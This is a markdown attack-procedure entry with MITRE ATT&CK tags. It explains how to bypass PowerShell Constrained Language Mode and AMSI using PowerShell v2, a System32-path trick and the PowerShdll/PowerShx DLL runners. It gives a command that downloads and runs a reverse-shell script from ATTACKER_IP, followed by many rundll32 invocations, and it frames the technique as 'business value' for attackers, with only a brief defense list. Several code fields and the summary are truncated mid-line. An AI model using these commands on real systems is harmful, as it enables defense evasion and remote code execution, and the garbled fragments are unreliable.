---
id: 681d5fb5-49cc-4f77-8e25-8398dbec9434
name: Bypassing Constrained Language Mode using Powershell DLL Runner
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.509803+00:00'
updated_at: '2023-04-10T20:37:04.060488+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[CMSTP|T1191 - CMSTP]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
tags:
- '[[Constrained Language Mode]]'
- '[[Powershell]]'
- '[[Windows - Defenses]]'
commands:
- '[[Download and execute PowerShell script]]'
- '[[PowerShdll Help]]'
- '[[PowerShdll Interactive Console]]'
- '[[PowerShdll Interactive Console]]'
- '[[PowerShdll Script Execution]]'
- '[[PowerShdll Script Execution]]'
- '[[PowerShx Attempt to Bypass AMSI]]'
- '[[PowerShx Interactive Console]]'
- '[[PowerShx Interactive Console]]'
- '[[PowerShx Print Execution Output]]'
- '[[PowerShx Script Execution]]'
- '[[PowerShx Script Execution]]'
- '[[PowerShx Script Execution with Cmdlet]]'
---

# Bypassing Constrained Language Mode using Powershell DLL Runner

## Summary

This procedure allows an attacker to bypass Constrained Language Mode (CLM) using Powershell DLL Runner. CLM is a security feature in Powershell that limits the functionality of scripts that are run in it. This technique allows an attacker to execute arbitrary code in a Powershell session that has 

## Description

# Description

This procedure allows an attacker to bypass Constrained Language Mode (CLM) using Powershell DLL Runner. CLM is a security feature in Powershell that limits the functionality of scripts that are run in it. This technique allows an attacker to execute arbitrary code in a Powershell session that has CLM enabled. The attacker can use this to bypass security controls and execute malicious code.

Technical Explanation: The attacker uses Powershell DLL Runner to load a malicious DLL into a Powershell session that has CLM enabled. The DLL contains the attacker's code, which can then be executed in the Powershell session.

Business Value: This technique allows an attacker to bypass security controls and execute arbitrary code in a Powershell session that has CLM enabled. This can be used to achieve persistence on a compromised system, exfiltrate data, or execute other malicious activities.

 

## Requirements

1. Access to a system with Powershell installed

1. Powershell DLL Runner tool

 

## Defense

1. Disable Powershell DLL Runner using AppLocker or other application whitelisting techniques

1. Monitor for Powershell sessions that have CLM disabled

1. Implement strict execution policies for Powershell scripts

 

## Objectives

1. Bypass Constrained Language Mode in a Powershell session

1. Execute arbitrary code in a Powershell session that has CLM enabled

 

# Instructions

1. To execute this command, open a PowerShell terminal and copy-paste the command into the terminal.

 



**Code**: [[powershell.exe -version 2
powershell.exe -version ]]



> This command can be used to bypass certain security measures that are in place on newer versions of PowerShell. The command uses PowerShell v2, which doesn't support Constrained Language Mode (CLM), a security feature that restricts the use of certain PowerShell commands and functions. The 'data' field contains multiple commands that can be executed in a PowerShell terminal. The 'name' field describes the purpose of the command, which is to bypass security measures. The 'instruction' field provides guidance on how to execute the command, and the 'explain' field provides additional information on the purpose and functionality of the command.



**Command** ([[Download and execute PowerShell script]]):

```powershell
powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
```



2. To bypass CLM using System32 path, follow the below instructions:
1. Enable CLM from the environment.
2. Create a check-mode.ps1 containing your "evil" powershell commands.
3. Execute the powershell script inside a System32 folder.

 



**Code**: [[# Enable CLM from the environment
[Environment]::S]]



> CLM or Constrained Language Mode is a security feature in PowerShell that restricts the usage of certain PowerShell commands and functions. However, this can be bypassed by using the System32 path. By executing the PowerShell script inside a System32 folder, the PowerShell interpreter assumes that the script is a trusted Microsoft binary and allows it to run in FullLanguage mode instead of ConstrainedLanguage mode.

3. This command allows you to use your own Powershell DLL to execute scripts or start an interactive console. The -f argument is used to specify the path of the script to be executed. The -w argument starts an interactive console in a new window, while -i starts an interactive console in the current window. The -s argument is used to attempt to bypass AMSI. The -v argument prints execution output to the console.

 



**Code**: [[rundll32 PowerShdll,main <script>
rundll32 PowerSh]]



> To use this command, first download the Powershell DLLs from the provided links. Then, use the rundll32 command followed by the path to the DLL and the desired arguments. For example, to run a script using PowerShdll, use the command 'rundll32 PowerShdll,main -f C:\path\to\script.ps1'. To start an interactive console using PowerShx, use the command 'rundll32 PowerShx.dll,main -w'. Note that the -s argument may not always successfully bypass AMSI.



**Command** ([[PowerShdll Script Execution]]):

```bash
rundll32 PowerShdll,main <script>
```





**Command** ([[PowerShdll Help]]):

```bash
rundll32 PowerShdll,main -h
```





**Command** ([[PowerShdll Script Execution]]):

```bash
rundll32 PowerShdll,main -f <path>
```





**Command** ([[PowerShdll Interactive Console]]):

```bash
rundll32 PowerShdll,main -w
```





**Command** ([[PowerShdll Interactive Console]]):

```bash
rundll32 PowerShdll,main -i
```





**Command** ([[PowerShx Script Execution]]):

```bash
rundll32 PowerShx.dll,main -e <PS script to run>
```





**Command** ([[PowerShx Script Execution]]):

```bash
rundll32 PowerShx.dll,main -f <path>
```





**Command** ([[PowerShx Script Execution with Cmdlet]]):

```bash
rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>
```





**Command** ([[PowerShx Interactive Console]]):

```bash
rundll32 PowerShx.dll,main -w
```





**Command** ([[PowerShx Interactive Console]]):

```bash
rundll32 PowerShx.dll,main -i
```





**Command** ([[PowerShx Attempt to Bypass AMSI]]):

```bash
rundll32 PowerShx.dll,main -s
```





**Command** ([[PowerShx Print Execution Output]]):

```bash
rundll32 PowerShx.dll,main -v
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[CMSTP|T1191 - CMSTP]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]

## Commands Used

- [[Download and execute PowerShell script]]
- [[PowerShdll Help]]
- [[PowerShdll Interactive Console]]
- [[PowerShdll Interactive Console]]
- [[PowerShdll Script Execution]]
- [[PowerShdll Script Execution]]
- [[PowerShx Attempt to Bypass AMSI]]
- [[PowerShx Interactive Console]]
- [[PowerShx Interactive Console]]
- [[PowerShx Print Execution Output]]
- [[PowerShx Script Execution]]
- [[PowerShx Script Execution]]
- [[PowerShx Script Execution with Cmdlet]]

## Tags

- [[Constrained Language Mode]]
- [[Powershell]]
- [[Windows - Defenses]]


